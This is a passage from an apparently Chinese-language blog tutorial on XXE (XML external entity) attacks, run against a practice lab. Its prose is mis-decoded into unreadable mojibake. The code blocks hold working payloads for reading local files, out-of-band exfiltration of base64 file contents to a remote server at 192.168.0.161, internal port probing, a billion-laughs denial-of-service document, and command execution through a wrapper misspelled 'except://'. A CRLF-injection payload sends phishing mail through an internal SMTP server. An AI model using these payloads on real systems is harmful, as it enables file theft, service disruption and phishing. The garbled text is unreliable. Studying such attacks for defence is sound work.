ä¸­ç¬¬ä¸€æ¬¡çœ‹åˆ°å®ä½“çš„çœŸé¢ç›®ï¼Œå®ä½“å…¶å®å¯ä»¥çœ‹æˆä¸€ä¸ªå˜é‡ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬å¯ä»¥åœ¨ XML ä¸­é€šè¿‡ &amp; ç¬¦å·è¿›è¡Œå¼•ç”¨ï¼‰ï¼Œé‚£ä¹ˆ XML å°±å¯ä»¥å†™æˆè¿™æ ·</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨ &amp;xxe å¯¹ ä¸Šé¢å®šä¹‰çš„ xxe å®ä½“è¿›è¡Œäº†å¼•ç”¨ï¼Œåˆ°æ—¶å€™è¾“å‡ºçš„æ—¶å€™ &amp;xxe å°±ä¼šè¢« â€œtestâ€ æ›¿æ¢ã€‚</p><h3 id="é‡ç‚¹"><a href="#é‡ç‚¹" class="headerlink" title="é‡ç‚¹"></a>é‡ç‚¹</h3><p><strong>é‡ç‚¹ä¸€ï¼š</strong></p><p>å®ä½“åˆ†ä¸ºä¸¤ç§ï¼Œå†…éƒ¨å®ä½“å’Œ<strong>å¤–éƒ¨å®ä½“</strong>ï¼Œä¸Šé¢æˆ‘ä»¬ä¸¾çš„ä¾‹å­å°±æ˜¯å†…éƒ¨å®ä½“ï¼Œä½†æ˜¯å®ä½“å®é™…ä¸Šå¯ä»¥ä»å¤–éƒ¨çš„ dtd æ–‡ä»¶ä¸­å¼•ç”¨ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢çš„ä»£ç ï¼š</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°,éå¸¸æ–¹ä¾¿ï¼ˆ<strong>æ–¹ä¾¿æ°¸è¿œæ˜¯å®‰å…¨çš„æ•Œäºº</strong>ï¼‰</p><p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§å¼•ç”¨æ–¹å¼æ˜¯ä½¿ç”¨ å¼•ç”¨<strong>å…¬ç”¨ DTD</strong> çš„æ–¹æ³•ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’Œ SYSTEM ä¸€æ ·çš„ä½œç”¨</p><p><strong>é‡ç‚¹äºŒï¼š</strong></p><p>æˆ‘ä»¬ä¸Šé¢å·²ç»å°†å®ä½“åˆ†æˆäº†ä¸¤ä¸ªæ´¾åˆ«ï¼ˆå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å¤–éƒ¨ï¼‰ï¼Œä½†æ˜¯å®é™…ä¸Šä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ä½“ä¹Ÿå¯ä»¥åˆ†æˆä¸¤ä¸ªæ´¾åˆ«ï¼ˆé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ï¼‰ï¼Œåˆ«æ™•ã€‚ã€‚</p><p><strong>1.é€šç”¨å®ä½“</strong></p><p>ç”¨ &amp;å®ä½“å; å¼•ç”¨çš„å®ä½“ï¼Œä»–åœ¨DTD ä¸­å®šä¹‰ï¼Œåœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure><p><strong>2.å‚æ•°å®ä½“ï¼š</strong></p><p>(1)ä½¿ç”¨ <code>% å®ä½“å</code>(<strong>è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘</strong>) åœ¨ DTD ä¸­å®šä¹‰ï¼Œå¹¶ä¸”<strong>åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ <code>%å®ä½“å;</code> å¼•ç”¨</strong><br>(2)åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“<br>(3)å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><h3 id="XXEæ”»å‡»æ‰‹æ®µæ±‡æ€»"><a href="#XXEæ”»å‡»æ‰‹æ®µæ±‡æ€»" class="headerlink" title="XXEæ”»å‡»æ‰‹æ®µæ±‡æ€»"></a>XXEæ”»å‡»æ‰‹æ®µæ±‡æ€»</h3><p>é¦–å…ˆå¤ç°éœ€è¦ç”¨åˆ°çš„é¡¹ç›®åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;xxe-lab</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/2.png" alt="image-20200724095320602"></p><p>é¦–å…ˆæ­å»ºå¥½ç¯å¢ƒåæˆ‘ä»¬å°è¯•æŠ“åŒ…</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/3.png" alt="image-20200724095301738"></p><p>å¯ä»¥çœ‹åˆ°ç±»ä¼¼æ ‡ç­¾é¡µä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰ä¸‹é¢çš„è¯·æ±‚å¤´çš„è¯å¯ä»¥æ·»åŠ è¿™ä¸ªå¤´ï¼Œè¿™æ ·å¯ä»¥è®©æœåŠ¡å™¨è¯•ç€è§£æXMLæ ¼å¼ï¼Œè¿™è¾¹æ˜¯ç›´æ¥å­˜åœ¨è¿™ä¸ªè¯·æ±‚å¤´ï¼Œå°±ä¸éœ€è¦æ·»åŠ äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨POSåŒ…é‡Œé¢æ·»åŠ XMLæ–‡æ¡£ï¼Œéœ€è¦ä½¿ç”¨<code>&amp;xxe;</code>æ¥å¼•ç”¨ä¸Šé¢çš„XXE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe &quot;ascotbe&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/4.png" alt="image-20200724100320554"></p><h4 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h4><h5 id="æœ‰å›æ˜¾æ–¹æ³•"><a href="#æœ‰å›æ˜¾æ–¹æ³•" class="headerlink" title="æœ‰å›æ˜¾æ–¹æ³•"></a>æœ‰å›æ˜¾æ–¹æ³•</h5><p>ä½¿ç”¨ä»¥ä¸‹POCå³å¯è¯»å–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/5.png" alt="image-20200724100524209"></p><h5 id="æ— å›æ˜¾æ–¹æ³•"><a href="#æ— å›æ˜¾æ–¹æ³•" class="headerlink" title="æ— å›æ˜¾æ–¹æ³•"></a>æ— å›æ˜¾æ–¹æ³•</h5><p>å¦‚æœç›´æ¥æ‰§è¡Œçš„è¯æ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾çš„ã€‚å¯ä»¥ä½¿ç”¨httpåè®®å°†è¯·æ±‚å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œä»è€Œè·å–æ–‡ä»¶å†…å®¹ã€‚</p><p>é¦–å…ˆåœ¨è¿œç¨‹æœåŠ¡å™¨å†™å…¥ä¸€ä¸ª<code>test.dtd</code>æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all </span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.0.161:8000&#x2F;?%file;&#39;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç›®æ ‡æœºå™¨ä¸Šå‘é€payloadæ¥åŠ è½½å®ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.161:8000&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/6.png" alt="image-20200724110415203"></p><p>ç„¶åæœåŠ¡å™¨ä¸Šé¢å°±èƒ½æ”¶åˆ°å†…å®¹äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/7.png" alt="image-20200724110442580"></p><p>è§£å¯†ä¸‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/8.png" alt="image-20200724110531774"></p><h4 id="ä¸»æœºæ¢æµ‹"><a href="#ä¸»æœºæ¢æµ‹" class="headerlink" title="ä¸»æœºæ¢æµ‹"></a>ä¸»æœºæ¢æµ‹</h4><p>ç›¸å…³è¯­è¨€å¯ä»¥ä½¿ç”¨çš„åè®®</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/9.png" alt="img"></p><p>ä½¿ç”¨ä»¥ä¸‹POCæ¥æ¢æµ‹ç›®æ ‡ä¸»æœºï¼Œæ‰€å¼€çš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥å†™ä¸ªpythonè„šæœ¬è·‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE ANY [</span><br><span class="line">        &lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;192.168.0.161:8000&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœå†…ç½‘æœ‰æœåŠ¡ä¼šæœ‰å“åº”ï¼Œå°±ç®—æ˜¯æ— å›æ˜¾çš„XXEçš„è¯ä¹Ÿä¼šè¿”å›æ•°æ®åŒ…è¿‡æ¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/10.png" alt="image-20200724110702674"></p><p>å¦‚æœå†…ç½‘æ— è¿™ä¸ªæœåŠ¡çš„è¯å°±ä¼šè¶…æ—¶ä¸ä¼šè¿”å›ä»»ä½•ä¸œè¥¿</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/11.png" alt="image-20200724110916397"></p><h4 id="DOSç‚¸å¼¹ğŸ’£"><a href="#DOSç‚¸å¼¹ğŸ’£" class="headerlink" title="DOSç‚¸å¼¹ğŸ’£"></a>DOSç‚¸å¼¹ğŸ’£</h4><p>ä¹‹å‰æœ‰ç¯‡DOSç‚¸å¼¹çš„æ–‡ç« æœ‰è®²è¿‡è¿™æ˜¯å…¶ä¸­çš„ä¸€ç§XMLçš„æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line"> &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure><p>å½“XMLè§£æå™¨åŠ è½½è¿™ä¸ªæ–‡æ¡£æ—¶ï¼Œä»–ä¼šçœ‹åˆ°å®ƒåŒ…å«ä¸€ä¸ªåŒ…å«æ–‡æœ¬<code>&amp;lol9;</code>çš„æ ¹å…ƒç´ ,ä¸è¿‡<code>&amp;lol9;</code>æ˜¯ä¸€ä¸ªå®šä¹‰çš„å®ä½“,æ‰©å±•åŒ…å«åä¸ª<code>&amp;lol8;</code>çš„å­—ç¬¦ä¸²,æ¯ä¸ª<code>&amp;lol8;</code>æ˜¯ä¸€ä¸ªå®šä¹‰çš„å®ä½“ï¼Œæ‰©å±•ä¸ºåä¸ª<code>&amp;lol7;</code>çš„å­—ç¬¦ä¸²ã€‚å› ä¸ºè®¸å¤šXMLè§£é‡Šå™¨åœ¨è§£æXMLæ–‡æ¡£æ—¶å€¾å‘äºå°†å®ƒçš„æ•´ä¸ªç»“æœä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œæ‰€ä»¥è¿™ä¸ªä¸åˆ°1kbçš„xmlæ–‡ä»¶å®é™…åŒ…å«10äº¿ä¸ªlol,å ç”¨å‡ ä¹3GBçš„å†…å­˜ï¼Œé€ æˆDDOSæ”»å‡»ã€‚</p><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><p>PHPç¯å¢ƒä¸‹,xmlå‘½ä»¤æ‰§è¡Œè¦æ±‚phpè£…æœ‰expectæ‰©å±•ã€‚è¯¥æ‰©å±•é»˜è®¤æ²¡æœ‰å®‰è£…ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;except:&#x2F;&#x2F;ipconfig&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h4 id="é’“é±¼æ”»å‡»"><a href="#é’“é±¼æ”»å‡»" class="headerlink" title="é’“é±¼æ”»å‡»"></a>é’“é±¼æ”»å‡»</h4><blockquote><p>è¯¥æ–¹æ³•æ²¡æœ‰è¯•éªŒè¿‡ï¼Œå…ˆçœ‹å¤§ä½¬æ–‡ç« è®°å½•ä¸‹</p></blockquote><p>å¦‚æœå†…ç½‘æœ‰ä¸€å°æ˜“å—æ”»å‡»çš„ SMTP æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨ ftp:// åè®®ç»“åˆ CRLF æ³¨å…¥å‘å…¶å‘é€ä»»æ„å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æŒ‡å®šå…¶å‘é€ä»»æ„é‚®ä»¶ç»™ä»»æ„äººï¼Œè¿™æ ·å°±ä¼ªé€ äº†ä¿¡æ¯æºï¼Œé€ æˆé’“é±¼ï¼ˆä¸€ä¸‹å®ä¾‹æ¥è‡ªfb çš„ä¸€ç¯‡æ–‡ç«  ï¼‰</p><p>Javaæ”¯æŒåœ¨sun.net.ftp.impl.FtpClientä¸­çš„ftp URIã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šç”¨æˆ·åå’Œå¯†ç ï¼Œä¾‹å¦‚<a href="ftp://user:password@host:port/test.txtï¼ŒFTPå®¢æˆ·ç«¯å°†åœ¨è¿æ¥ä¸­å‘é€ç›¸åº”çš„USERå‘½ä»¤ã€‚">ftp://user:password@host:port/test.txtï¼ŒFTPå®¢æˆ·ç«¯å°†åœ¨è¿æ¥ä¸­å‘é€ç›¸åº”çš„USERå‘½ä»¤ã€‚</a></p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬å°†%0D%0A (CRLF)æ·»åŠ åˆ°URLçš„useréƒ¨åˆ†çš„ä»»æ„ä½ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»ˆæ­¢USERå‘½ä»¤å¹¶å‘FTPä¼šè¯ä¸­æ³¨å…¥ä¸€ä¸ªæ–°çš„å‘½ä»¤ï¼Œå³å…è®¸æˆ‘ä»¬å‘25ç«¯å£å‘é€ä»»æ„çš„SMTPå‘½ä»¤ï¼š</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a%0D%0A</span><br><span class="line">EHLO%20a%0D%0A</span><br><span class="line">MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A</span><br><span class="line">RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A</span><br><span class="line">DATA%0D%0A</span><br><span class="line">From%3A%20support%40VULNERABLESYSTEM.com%0A</span><br><span class="line">To%3A%20victim%40gmail.com%0A</span><br><span class="line">Subject%3A%20test%0A</span><br><span class="line">%0A</span><br><span class="line">test!%0A</span><br><span class="line">%0D%0A</span><br><span class="line">.%0D%0A</span><br><span class="line">QUIT%0D%0A</span><br><span class="line">:a@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>å½“FTPå®¢æˆ·ç«¯ä½¿ç”¨æ­¤URLè¿æ¥æ—¶ï¼Œä»¥ä¸‹å‘½ä»¤å°†ä¼šè¢«å‘é€ç»™VULNERABLESYSTEM.comä¸Šçš„é‚®ä»¶æœåŠ¡å™¨ï¼š</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a</span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;</span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http:&#x2F;&#x2F;PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä»ä»å—ä¿¡ä»»çš„æ¥æºå‘é€é’“é±¼é‚®ä»¶ï¼ˆä¾‹å¦‚ï¼šå¸æˆ·é‡ç½®é“¾æ¥ï¼‰å¹¶ç»•è¿‡åƒåœ¾é‚®ä»¶è¿‡æ»¤å™¨çš„æ£€æµ‹ã€‚é™¤äº†é“¾æ¥ä¹‹å¤–ï¼Œç”šè‡³æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘é€é™„ä»¶ã€‚</p><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><blockquote><p>è¯¥æ–¹æ³•æ²¡æœ‰è¯•éªŒè¿‡ï¼Œå…ˆçœ‹å¤§ä½¬æ–‡ç« è®°å½•ä¸‹</p></blockquote><p><strong>jar:// åè®®çš„æ ¼å¼ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br></pre></td></tr></table></figure><p><strong>å®ä¾‹ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;host&#x2F;application.jar!&#x2F;file&#x2F;within&#x2F;the&#x2F;zip</span><br><span class="line"></span><br><span class="line">è¿™ä¸ª ! åé¢å°±æ˜¯å…¶éœ€è¦ä»ä¸­è§£å‹å‡ºçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>jar èƒ½ä»è¿œç¨‹è·å– jar æ–‡ä»¶ï¼Œç„¶åå°†å…¶ä¸­çš„å†…å®¹è¿›è¡Œè§£å‹ï¼Œç­‰ç­‰ï¼Œè¿™ä¸ªåŠŸèƒ½ä¼¼ä¹æ¯” phar å¼ºå¤§å•Šï¼Œphar:// æ˜¯æ²¡æ³•è¿œç¨‹åŠ è½½æ–‡ä»¶çš„</p><p><strong>jar åè®®å¤„ç†æ–‡ä»¶çš„è¿‡ç¨‹ï¼š</strong></p><p>(1) ä¸‹è½½ jar/zip æ–‡ä»¶åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­<br>(2) æå–å‡ºæˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶<br>(3) åˆ é™¤ä¸´æ—¶æ–‡ä»¶</p><blockquote><p><strong>é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆæ‰¾åˆ°æˆ‘ä»¬ä¸‹è½½çš„ä¸´æ—¶æ–‡ä»¶å‘¢ï¼Ÿ</strong></p><p>å› ä¸ºåœ¨ java ä¸­ file:/// 